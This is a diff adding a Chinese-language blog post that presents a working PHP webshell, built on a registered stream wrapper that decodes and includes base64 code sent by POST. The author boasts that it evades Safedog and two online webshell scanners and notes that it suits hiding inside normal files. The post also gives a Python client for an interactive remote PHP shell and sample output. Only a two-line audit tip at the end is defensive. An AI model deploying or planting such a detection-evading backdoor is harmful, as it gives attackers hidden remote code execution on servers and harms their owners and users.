@@ -1,0 +1,340 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  非正常 PHP Shell - 产生Shell的一种新方法 |   Hello! I am DXkite </title>
+
+ 
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+
+  <link rel="stylesheet" href="/nayo.min.css"> 
+</head>  
+  <body>   
+    
+      <header class="header">
+	
+  <nav class="header-nav">        
+   
+    <span class="iconfont icon-menu mobile-toggle"></span>   	
+
+    <div class="header-menu">          
+              
+            
+
+              <a class="header-menu-link" id="header-menu-home" href="/">首页</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-archives" href="/archives">归档</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-tags" href="/tags">标签</a>     
+
+            
+            
+            
+
+              <a class="header-menu-link" id="header-menu-about" href="/about">关于</a>     
+
+            
+            
+            
+
+              <a class="iconfont icon-menu-search header-menu-link" id="header-menu-search"></a>
+
+            
+                
+    </div>  
+    
+  </nav>
+</header>   
+
+      <div class="container">       
+          
+          
+            <section class="main">  
+          
+
+          <article class="post">
+  
+	<div class="post-header">
+
+	<p class="post-title">	
+		非正常 PHP Shell - 产生Shell的一种新方法
+	</p>
+			
+
+	<div class="meta-info">	
+	<span>
+		7月 03, 2018
+	</span>
+
+	
+	
+		<i class="iconfont icon-words"></i>
+		<span>
+			3339
+		</span>
+	
+</div>
+
+</div> 
+	 
+
+	  <div class="post-content slideDownMin">
+
+		
+
+			
+					<p>安全狗绕过是一个比较热门的话题？反正我这边这个<code>Shell</code> 经过 安全狗、<a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a> 、<a href="http://n.shellpub.com" target="_blank" rel="noopener">http://n.shellpub.com</a> 的检测，没检测出来，美滋滋。</p>
+<h2 id="检测结果"><a href="#检测结果" class="headerlink" title="检测结果"></a>检测结果</h2><ul>
+<li><a href="http://n.shellpub.com/zip/tid/6b86f122-0392-404b-a660-41ef11b38e15.html" target="_blank" rel="noopener">http://n.shellpub.com/zip/tid/6b86f122-0392-404b-a660-41ef11b38e15.html</a></li>
+<li><a href="https://scanner.baidu.com/#/pages/scan_result?hash=fe0c44bd777ef0f9bae897ed79f3d4b9" target="_blank" rel="noopener">https://scanner.baidu.com/#/pages/scan_result?hash=fe0c44bd777ef0f9bae897ed79f3d4b9</a></li>
+</ul>
+<a id="more"></a>
+<h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>通过PHP函数 <code>stream_wrapper_register</code> 注册包装器，检测特定的URL包装功能，监控 <code>include</code> 流，在 <code>include</code> 流中动态生成PHP代码，本来是用来做PHP源代码加密的，但是想了下，好像这种方式还没有被安全狗检测，翻阅了大部分安全狗的检测机制，讲道理没有看到有关的文献。具体原理参考我的上一篇文章，不打算菜刀适配（其实是菜刀的运行原理我看起来头晕）。</p>
+<h2 id="Shell代码"><a href="#Shell代码" class="headerlink" title="Shell代码"></a>Shell代码</h2><p>代码稍微有些长，适合隐藏在正常的文件中使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 异形 Shell，一串看似完全正常代码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> dxkite &lt;dxkite<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> //dxkite.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShellStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $position;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $url = parse_url($path);</span><br><span class="line">        $name = $url[<span class="string">"host"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = base64_decode($name);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span><span class="params">($count)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = substr(<span class="keyword">$this</span>-&gt;code, <span class="keyword">$this</span>-&gt;position, $count);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position += strlen($ret);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_tell</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position &gt;= strlen(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_seek</span><span class="params">($offset, $whence)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($whence) &#123;</span><br><span class="line">            <span class="keyword">case</span> SEEK_SET:</span><br><span class="line">                <span class="keyword">if</span> ($offset &lt; strlen(<span class="keyword">$this</span>-&gt;code) &amp;&amp; $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> SEEK_CUR:</span><br><span class="line">                <span class="keyword">if</span> ($offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position += $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SEEK_END:</span><br><span class="line">                <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;code) + $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = strlen(<span class="keyword">$this</span>-&gt;code) + $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]) &#123;</span><br><span class="line">            stream_wrapper_register(<span class="string">'shell'</span>, ShellStream::class);</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">'password'</span>]==<span class="string">'dxkite'</span>) &#123;</span><br><span class="line">                $code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">                <span class="keyword">include</span> <span class="string">'shell://'</span>.$code;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">include</span> <span class="string">'shell://PD9waHAgZWNobyAiaGVsbG8gaGFjayI7'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ShellStream::shell();</span><br></pre></td></tr></table></figure>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>不打算做菜刀适配，本文仅供安全研究</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_raw</span><span class="params">(url,password,cmd)</span>:</span></span><br><span class="line">    res=requests.post(url,&#123;</span><br><span class="line">        <span class="string">'password'</span>:password,</span><br><span class="line">        <span class="string">'code'</span>: base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>)) </span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_php_shell</span><span class="params">(url,password,cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_raw(url,password,<span class="string">'&lt;?php '</span>+cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'Usage:\r\n\tpython shell.py url password'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    password =sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = input(<span class="string">'php-shell&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> cmd.startswith(<span class="string">'run'</span>):</span><br><span class="line">            cmd,path = cmd.split(<span class="string">' '</span>,<span class="number">1</span>)</span><br><span class="line">            code = <span class="string">''</span></span><br><span class="line">            <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    code = code + line + <span class="string">"\r\n"</span> </span><br><span class="line">            response = send_raw(url,password,code);</span><br><span class="line">            print(response)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = send_php_shell(url,password,cmd);</span><br><span class="line">            print(response)</span><br></pre></td></tr></table></figure>
+<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Server\Local\suda\public\assets\eval&gt; python .\shell.py &apos;http://suda.atd3.org/assets/eval/shell.php&apos; dxkite</span><br><span class="line">php-shell&gt;echo &apos;hello,dxkite&apos;;</span><br><span class="line">hello,dxkite</span><br><span class="line">php-shell&gt;echo __FILE__;</span><br><span class="line">D:\Server\Local\suda\public\assets\eval\6070fc111c81737d263f97471b4f31ee.shell</span><br><span class="line">php-shell&gt;exit</span><br><span class="line">PS D:\Server\Local\suda\public\assets\eval&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="代码审计避免此类Shell"><a href="#代码审计避免此类Shell" class="headerlink" title="代码审计避免此类Shell"></a>代码审计避免此类Shell</h2><ul>
+<li>接受了外部输入</li>
+<li>注册了孤岛式的流包装器</li>
+</ul>
+  	
+					
+	  </div>     
+	  
+
+	
+<div class="post-meta">
+      
+        <i class="iconfont icon-category"></i>       
+        <a class="category-link" href="/categories/技术分享/">技术分享</a> 	
+     
+      	
+
+      
+        <i class="iconfont icon-tag"></i>     
+          <a class="tag-link" href="/tags/PHP/">PHP</a> <a class="tag-link" href="/tags/网络安全/">网络安全</a>    
+      	
+</div>
+
+
+
+
+
+<div class="post-footer">
+  <div class="pf-left">
+      <img class="pf-avatar" src="/dxkite.png">
+      <p class="pf-des">Hello! I am DXkite</p>
+  </div>
+
+  <div class="pf-right">           
+      <div class="pf-links">
+        
+
+
+
+
+<span class="donate-btn">
+	<span class="iconfont icon-donate"></span>
+</span>
+
+
+<div id="donate-box" class="sildeUpMin">
+
+	<span class="donate-cancel iconfont icon-cancel"></span>
+
+	<div class="donate-img-box">
+		<img id="donate-qr-wechat" class="noLazyLoad donate-img" src="/images/donate1.png" alt="No Donate Image!">	
+		<img id="donate-qr-alipay" class="noLazyLoad donate-img" src="/images/donate2.png" alt="No Donate Image!">	
+	</div>
+
+	<span class="donate-word">世界美好 你也是</span>
+
+	<div class="donate-list">
+		<span class="iconfont icon-donate-wechat"></span>
+		<span class="iconfont icon-donate-alipay"></span>
+	</div>
+
+</div>
+
+ 
+        
+	
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+	
+	<span class="share-btn">
+	<span class="iconfont icon-share"></span>
+	</span>
+
+
+	<div class="-mob-share sildeUpMin">
+		   			             
+            <a class="iconfont  icon-share-qq -mob-share-qq"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weixin -mob-share-weixin"></a>		
+     	   			             
+            <a class="iconfont  icon-share-weibo -mob-share-weibo"></a>		
+     	   			             
+            <a class="iconfont  icon-share-douban -mob-share-douban"></a>		
+     	   			             
+            <a class="iconfont  icon-share-facebook -mob-share-facebook"></a>		
+     	   			             
+            <a class="iconfont  icon-share-twitter -mob-share-twitter"></a>		
+     	   			             
+            <a class="iconfont  icon-share-google -mob-share-google"></a>		
+     	   
+	</div>	
+
+      </div>  
+    <nav class="pf-paginator">
+      
+         
+          <a href="/2018/07/04/use-assets-in-hexo/" data-hover="在Hexo博客系统中引用图片与资源">上一篇</a>      
+            
+        
+      
+        
+        <a href="/2018/07/02/x10sec-web2-writeup/" data-hover="x10sec web2 题解"> 下一篇</a>
+            
+  </nav>   
+  </div>
+</div> 
+	
+
+
+    
+    <div id="disqus_thread"></div>
+
+    <script>
+    (function() { 
+    var d = document, s = d.createElement('script');
+    s.src = 'https://'+'lemonreds'+'.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());    
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+    </noscript>
+
+
+	
+</article>
+
+          </section> 
+      </div>            
+    
+    <a id="backTop">
+      <span>
+        <i class="iconfont icon-backtotop"></i>
+      </span>
+    </a> 
+
+  
+    
+    <div class="search-container sildeUpMin">
+        <div class="search-header">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">  
+            <span class="search-cancel iconfont icon-cancel"></span>
+        </div>
+        <div id="search-result" class="search-result"></div>
+    </div>
+ 
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src="/favicon.png">   
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">首页
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">归档
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">标签
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">关于
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
+            
+         
+      
+</div>        
+    
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d7aee75a7326ba3e59244e2db26823c8"; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+
+     
+    
+
+
+
+
+<footer id="footer">	    
+
+		
+		<div class="footer-copyright">
+		&copy;
+		
+		2018		
+	
+		DXkite
+		<br>
+
+		Theme By
+		<a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>	
+		</div>			
+	 
+</footer>   
+
+  
+
+    <script src="/nayo.bundle.js"></script>           
+  </body>        
+</html>
